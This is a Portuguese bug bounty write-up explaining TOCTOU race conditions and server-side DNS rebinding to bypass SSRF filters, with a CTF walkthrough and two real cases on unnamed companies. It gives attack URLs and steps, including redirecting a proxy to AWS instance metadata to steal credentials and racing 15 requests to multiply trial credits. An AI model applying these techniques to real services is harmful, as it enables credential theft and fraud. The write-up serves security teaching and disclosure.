# DNS Rebinding, um caso de race condition.

- **Source URL:** https://medium.com/@bminossi/dns-rebinding-um-caso-de-race-condition-f0360d94a828?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126143223/https://medium.com/@bminossi/dns-rebinding-um-caso-de-race-condition-f0360d94a828
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/2110 (id 2110)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# **Usando técnica de DNS Rebinding em um caso de TOCTOU Race Condition.**

Salve, galera! Beleza? Zeroc00i aqui

## ***\[Parte explicando um pouco sobre a escolha do estilo de escrita deste artigo, você pode pular isto\]***

Bom, para escrever esse artigo aqui eu primeiramente pensei em qual linguagem usar. 

Resolvi, então, realmente fazer algo um pouco mais descontraído do que de costume (tentarei rsrs) — e, consequentemente, mais fluido de ler — , já que é assim que eu venho aprendendo desde criança, de forma autodidata / distante daquele ensino estilo acadêmico.

Calma aí, não é que eu tenha aversão ao estilo acadêmico, não me entenda mal! Eu acredito que a academia guarda uma quantidade enorme e profunda de conhecimento com veia de pesquisa. Mas, em todas as minhas tentativas de adquirir conhecimento acadêmico da forma tradicional, eu sempre tive muita dificuldade com o padrão de ter que buscar e decorar respostas para as perguntas já feitas. Poxa, e se eu quisesse fazer as minhas próprias perguntas e aprender com os meus próprios erros?

Dessa forma, fui tentando criar meu próprio caminho de aprendizado, com a minha própria forma de comunicação. Assim, desse artigo, não espere uma linguagem rebuscada e nem respostas exatas que irão sanar as suas dúvidas.

Aqui, o meu objetivo é que você chegue às linhas finais com muito mais perguntas do que quando começou.

## **Então, deixando agora estas minhas filosofias de lado…**

Eu peguei uns casos bem legais de Race condition (do tipo TOC-TOU) usando técnica de DNS rebinding enquanto estudava umas aplicações e queria compartilhar com vocês para não acharem que é uma vulnerabilidade somente teórica ou distante / rara.

## Importante ter em mente que…

Antes de começar a discorrer na parte técnica deste artigo, é importante alinharmos alguns conceitos para que não haja interpretações diversas:

- Neste artigo serão mencionados alguns casos de “DNS Rebinding”. **Muitos podem imediatamente pensar no ataque de DNS Rebinding**, que ocorre no lado do cliente (da vítima) e tem como objetivo contornar a Política de Mesma Origem (SOP) por meio da alternância do endereço IP do domínio que a vítima está acessando, a fim de que o domínio permaneça numa mesma **origem permitida,** mas enviando requisições para outro IP, — seja agora resolvendo para localhost a fim de extrair informações de um IP dentro da rede interna da vítima, seja resolvendo para um IP externo a fim do atacante receber informações coletadas na etapa citada anteriormente. **No entanto, hoje não abordaremos esse cenário**. Aqui, usaremos o termo apenas para a ação de “rebinding” do servidor DNS no contexto do SSRF.
- Além disso, mencionaremos “Race condition” no contexto da técnica de DNS Rebinding. Nesse contexto, a referência não será para a clássica “Race condition”, que é baseada em altas threads e tem como objetivo promover uma disputa entre elas, mas sim para a real definição do “CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition” ao qual é citado nas referências deste artigo e que resumidamente se concentra muito mais no “bypass” feito durante essa janela de “tempo de checagem / tempo de uso”.

**Muitos confundem race condition com a ausência de mecanismo antiautomação**


Um dos motivos deste artigo existir é que vi ser bastante comum no cenário de segurança o reporte de vulnerabilidades com o nome de **race condition** quando, na verdade, estão reportando uma **ausência de mecanismo antiautomação**. Você saberia explicar a diferença?

Sob minha humilde perspectiva, eu resumiria assim:

## **Ausência de mecanismo antiautomação**:

Em uma dada funcionalidade da aplicação, esta funcionalidade não emprega um mecanismo que dificulte sua automação, de forma a trazer vantagens para o invasor explorar mais facilmente sua aplicação.

**Exemplo**: Existe um formulário de login no site em que eu posso interceptar a requisição de autenticação enviada por ele - de forma a repeti-la -, e **modificar o parâmetro senha** enviado (neste exemplo a fim de tentar fazer um *bruteforce* em algum usuário específico), sem qualquer impedimento por parte do sistema de reduzir a quantidade de tentativas por segundo de autenticação do invasor; uma vez que não emprega mecanismo que dificulte sua automação, como por exemplo a implementação de um *captcha*.

Repare que agora quando eu for explicar a definição de um race condition, a possibilidade de enviar diversas requisições paralelamente, provoca um comportamento **inesperado** na aplicação, muitas vezes ferindo a regra de negócio da empresa, e não somente causa um comportamento já esperado pela aplicação, como é o caso acima, ao qual somente estamos automatizando resultados “já esperados”: Senha correta/ Senha incorreta.


## **Race condition**:

- Segundo o Mitre ([https://cwe.mitre.org/data/definitions/367.html](https://cwe.mitre.org/data/definitions/367.html)), um race condition ocorre quando um produto verifica corretamente o estado atual de um recurso antes de seu consumo, mas **não leva em conta que o estado deste recurso pode se alterar entre a checagem e o real uso dele**, de tal forma invalidando/*bypassando* o resultado da etapa de checagem. Por esta razão, é também apelidada de TOC-TOU (Time-of-check Time-of-use).
- **Exemplo**: Você deseja realizar uma transferência bancária para mim (Bruno), através do seu aplicativo bancário.
Para realizar essa transferência em seu banco, o sistema**primeiro verifica** se você tem aquele dinheiro e só **após efetua** a transferência e **a subtração** do valor, certo?
Agora imagine que esses dois (2) processos sejam partes de um ecossistema de integrações de API, de forma que seja razoável admitirmos que entre a checagem de seu saldo e a transferência de saque possa existir um*delay* razoável em dadas circunstâncias.

- **(Parte do *mindblowing*)** Agora pense que você tem cem reais (R$100) na conta e que seu banco não permite saldo negativo (vamos imaginar que não permite pois, aqui neste exemplo, o banco não prevê a possibilidade da funcionalidade de empréstimo para você).
Assim, na hora de me enviar os cem reais, você clica duas vezes em efetuar transferência do saldo total.
Devido à isto, duas (2) requisições são enviadas para a API de seu banco e o seguinte comportamento é executado:
- 1 — A aplicação recebe a primeira solicitação de transferência e então verifica que você tem os R$100 que solicitou.
- Beleza … ela transfere os R$100 para mim (Bruno). Agora, basta ela seguir para o etapa de subtrair o val…
- 2 — Ops! No meio do processo a aplicação recebe outra requisição para transferência. É como se ela pensasse: “Hm… vou ver se você tem o suficiente para transferir isto que você solicitou. Hmm.. parece que você tem os R$100, beleza, pode transferir isso aí que pediu :)”.
- 3 — Então, a primeira requisição finaliza sua operação realizando a subtração dos R$100 transferidos. Agora sua conta tem um total de R$0,00.
- 4 — Logo, a segunda requisição também finaliza sua operação, realizando a subtração de outros R$100. E como você tem atualmente R$0,00 e não é permitido saldo negativo, você continua com o mesmo saldo total equivalente a R$0,00.
- E mesmo assim, adivinha quanto foi o valor que eu recebi de suas transferências :) ? Isto mesmo, R$200.00.
- Você acaba de explorar um *race condition.*

## DNS rebinding:

- Agora que você já sabe como acontece um race condition, pode aplicá-lo em diferentes contextos. Como, por exemplo, no contexto do DNS Rebinding, que como o próprio nome sugere: Você vai rebindar/religar o DNS / “*bindando*” ele duas (2) vezes.
- Na primeira “*bindagem*” você faz seu domínio responder para um IP que esteja suprindo a restrição imposta pela aplicação alvo (como por exemplo resolver para 127.0.0.1 / localhost — pois é considerado uma rede segregada segura). Logo após **esta condição ser atendida** (oh a condição da parte race **condition** aí), você *rebinda* seu domínio para um novo IP, ao qual está sob sua posse.
- Para ficar mais claro sobre como ocorre o cenário acima, criei um desafio de DNS Rebinding na página de desafios. [https://bountyleaks.cf/challenge](https://bountyleaks.cf/challenge).

Desta forma, irei apresentar nos próximos passos uma resolução mais resumida (comparada com as writeups que sempre faço para cada desafio lançado) de como resolvê-lo e qual é o comportamento executado no *backend:*

- 1\. Acesse a URL: [https://bountyleaks.cf/challenge/proxy.php](https://bountyleaks.cf/challenge/proxy.php).
- 2\. Faça um *fuzzing* de parâmetros, de forma a descobrir que o parâmetro domain provoca um comportamento diferente na aplicação (existe uma nova funcionalidade presente com a utilização dele).
- 3\. Acesse [https://bountyleaks.cf/challenge/proxy.php?domain=teste.com.br](https://bountyleaks.cf/challenge/proxy.php?domain=teste.com.br) e note que domínio **teste.com.br** não é permitido, vide a mensagem: “The inputted domain is not allowed”.
- 4\. Tenha em mãos algum domínio que resolverá para localhost, a exemplo **127.0.0.1.nip.io.** Desta forma acesse: [https://bountyleaks.cf/challenge/proxy.php?domain=127.0.0.1.nip.io](https://bountyleaks.cf/challenge/proxy.php?domain=127.0.0.1.nip.io)
- Opa, note que tivemos um comportamento diferente! Veja a mensagem retornada: “Secret sent to the domain successfully :)”
- 5\. Sabemos então que quando um domínio resolve localmente (127.0.0.1) a aplicação envia um segredo para o domínio que controlamos. O mesmo domínio que enviamos na etapa de validação (para validar se o domínio é permitido ou não) é também usado para a etapa de envio do segredo. Então… Como podemos receber esse segredo se ele é enviado só localmente? 
Isso mesmo, usando DNS Rebinding através do abuso de um Race Condition.
- 6\. O que temos que fazer agora é cumprir a etapa de validação com um domínio que resolve para um IP interno e, após essa consulta DNS, o IP deve alterar para um de nossa posse; assim, enviando o segredo para nossa VPS.
- 7\. Você pode configurar este domínio que resolve primeiro para um IP e após a primeira consulta resolve para outro de duas formas:
- a) Usando uma solução que deve ser hospedada em sua VPS (Consulte o respositório [https://github.com/brannondorsey/dns-rebind-toolkit](https://github.com/brannondorsey/dns-rebind-toolkit)).
b) Utilizando o serviço[https://ceye.io/](https://ceye.io/), o qual vai criar uma URL final para gente, sem precisar que tenhamos uma VPS.
- 8\. Bem, ao final será gerada uma URL neste estilo: **r.5t9yy4.ceye.io**
Ela será responsável por responder ora para localhost e ora para o IP da minha VPS (portanto você deve criar o seu link no site, para responder para o IP de sua VPS).
No painel do ceye.io, ficará algo como (lembre de acrescer**r.** ao inicio do identifier, para acionar a resolução por DNS Rebinding):

- 9\. Com a URL que permitirá o DNS rebinding ser executado em mãos, simplesmente acrescemos esse domínio ao final da URL do desafio, ficando: [https://bountyleaks.cf/challenge/proxy.php?domain=r.5t9yy4.ceye.io](https://bountyleaks.cf/challenge/proxy.php?domain=r.5t9yy4.ceye.io)
- 10\. Nesse momento a aplicação tenta resolver o IP do domínio r.5t9yy4.ceye.io e recebe o valor 127.0.0.1. Beleza! Pode passar, já que é um IP interno =)
- 11\. Agora, a aplicação vai enviar o segredo para r.5t9yy4.ceye.io, mas espera aí! Assim que o CURL tiver sido executado, ele notará que a resolução de IP não é mais 127.0.0.1 (oooohhhh yeahhh), dessa forma vamos ter forjado o envio do segredo para o IP de nossa VPS =)

- 12\. PARABÉNS. **Concluímos o desafio o/**

## Um cenário real de DNS rebinding

A inspiração para esse desafio certamente veio através da exploração de uma aplicação real e muito conhecida. 

Adianto que devido a ela não estar em programa de bugbounty, vou chamá-la de **EmpresaDoZero =)**

A aplicação **EmpresaDoZero** tinha uma funcionalidade de importação de arquivo a partir de uma URL externa.

Ao utilizar esta funcionalidade, a seguinte URL era chamada: [https://empresadozero.com/proxy/?url=http://siteexterno.com](https://empresadozero.com/proxy/?url=http%3A%2F%2Fsiteexterno.com)

Quando vemos esse tipo de padrão, imediatamente pensamos: SSRF!

Tentei, então, acessar [https://empresadozero.com/proxy/?url=](https://empresadozero.com/proxy/?url=)http://127.0.0.1. E a aplicação mostrou um erro, como se a solicitação fosse inválida.

Claro, também tentei o IP de uma instância na Amazon (a fim de ler o metadata): [https://empresadozero.com/proxy/?url=](https://empresadozero.com/proxy/?url=)[http://169.254.169.254](http://169.254.169.254/). Também não obtive resultado =(.

Então, resolvi colocar o endereço da minha VPS e fiquei escutando consultas DNS e HTTP, usando o interact-sh ([https://github.com/projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh)). Deixei também uma imagem para a aplicação buscar, chamada zerocool.png.

Assim que acessei [https://empresadozero.com/proxy/?url=http://](https://empresadozero.com/proxy/?url=http%3A%2F%2F)bountyleaks.cf/zerocool.png, recebi **duas (2) requisições** da aplicação, mas **com diferentes IPs**: Uma delas era uma consulta DNS e outra HTTP.

Então pensei aquela lógica do TOC-TOU que já mencionei aqui: E se eu forjar a requisição para um IP diferente daquele quando foi feita a primeira validação?

Pensei também que provavelmente a primeira requisição que recebi (DNS) armazenava se o domínio correspondia à algum IP com potencial risco (resolvendo localmente) e caso fosse um IP externo, passaria para a próxima etapa, fazendo uma requisição HTTP para baixar a imagem.

É importante ressaltar que as aplicações normalmente tendem a se preocupar em isolar seus serviços em uma rede interna. Desta forma, caso o invasor conseguisse usar um domínio que respondesse para localhost, existiria a possibilidade dele atingir um non-blind SSRF (aquele que possui a resposta HTTP da requisição efetuada). No entanto, como a aplicação somente aceitava domínios que em primeiro momento resolvesse para IPs externos, eu acreditava que a aplicação estivesse livre deste *bypass* em específico.

Voltando à exploração feita, criei um script para assim que recebesse uma requisição da aplicação, resolvesse para um domínio qualquer. Mas que, assim que recebesse a segunda, redirecionava para o metadata da instância da AWS.

(Este script foi substancialmente inspirado no writeup do Vinicius Ribeiro, o qual você pode ler mais aqui):

[https://www.linkedin.com/pulse/bounty-writeup-ssrf-aws-api-vinicius-ribeiro-ferreira-da-silva/](https://www.linkedin.com/pulse/bounty-writeup-ssrf-aws-api-vinicius-ribeiro-ferreira-da-silva/)


Dessa forma, assim que acessei novamente [https://empresadozero.com/proxy/?url=http://bountyleaks.cf/](https://empresadozero.com/proxy/?url=http%3A%2F%2Fbountyleaks.cf%2F), tendo agora este script escutando na porta web, que bypassa a primeira condição da aplicação sobre impossibilidade de IPs locais e, após a segunda requisição, o script forja a requisição redirecionando-a para o metadata da instância da AWS:

Não só consegui ter **acesso as credenciais da instância da AWS** usada pela aplicação, como também utilizá-la e **listar todos os buckets hospedados por ela**. Encontrei **backups da aplicação com SQL, variáveis de ambiente, códigos de produção**, enfim, foi uma loucura e foi devidamente reportado para o CEO, que em alguns dias fez o *fixing*.

## Um cenário real de race condition

Um cenário real de race condition que eu tenho para contar para vocês, foi em uma aplicação a qual chamarei de **OutraEmpresaDoZero.**

A **OutraEmpresaDoZero** concedia 1 crédito para que você pudesse experimentar seus serviços e, consequentemente, logo após você teria que assinar um plano para receber mais créditos.

Então assim que você usava uma dada funcionalidade na aplicação, um (1) crédito era descontado de sua conta.

Veio a ideia de race condition aí tambem? rsrsrs

Você lembra do exemplo que dei do aplicativo bancário? Foi o mesmo cenário que rolou aqui…

Estudei como era a requisição feita pela **OutraEmpresaDoZero** para “gastar o crédito” e forcei 15 requisições executarem ao mesmo tempo, para 15 “coisas” diferentes dentro da aplicação, possuindo só 1 crédito na minha conta.

E sabe qual foi o final? Fiquei com 0 créditos, mas com 15 serviços reservados.

**A OutraEmpresaDoZero** ainda permitia você cancelar essa reserva, voltando 1 de crédito para sua conta. Então, se eu cancelasse os 15 serviços reservados, conseguiria resgatar 15 créditos.

Não faço milagres, mas transformei um (1) crédito em quinze (15), somente por uma falha de TOC-TOU.

## Agradecimentos

Agradeço seu tempo por ter lido todo este artigo!

Agradeço também à Ana Maria Guimarães, a mulher da minha vida e a maior referência que eu já vi de LGPD, por sempre revisar os meus artigos antes de serem publicados.

Contatos

Sinta-se livre para me contatar nos seguintes canais:

[https://twitter.com/zeroc00i](https://twitter.com/zeroc00i)

[https://www.linkedin.com/in/bruno-menozzi/](https://www.linkedin.com/in/bruno-menozzi/)

[https://t.me/zeroc00i](https://t.me/zeroc00i)

Referências:
